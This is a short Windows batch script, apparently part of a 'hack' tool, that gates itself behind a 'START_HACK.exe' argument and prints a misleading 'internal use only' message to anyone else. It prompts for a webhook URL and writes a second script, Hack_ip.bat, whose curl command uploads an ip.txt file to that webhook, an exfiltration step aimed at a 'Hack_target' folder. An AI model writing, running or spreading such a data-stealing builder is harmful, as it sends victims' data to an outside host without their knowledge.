@echo off

IF NOT "%~1"=="START_HACK.exe" (
  echo This batch file is for internal use only.
  echo If you are not a developer, please contact your administrator.
  exit /b
)

color c
SET /p webhook=" webhook >  "
cd Hack_target
echo -hack >> Hack_ip.bat
echo curl -X POST -F "file=@ip.txt-hack" "%webhook%" >>Hack_ip.bat
exit
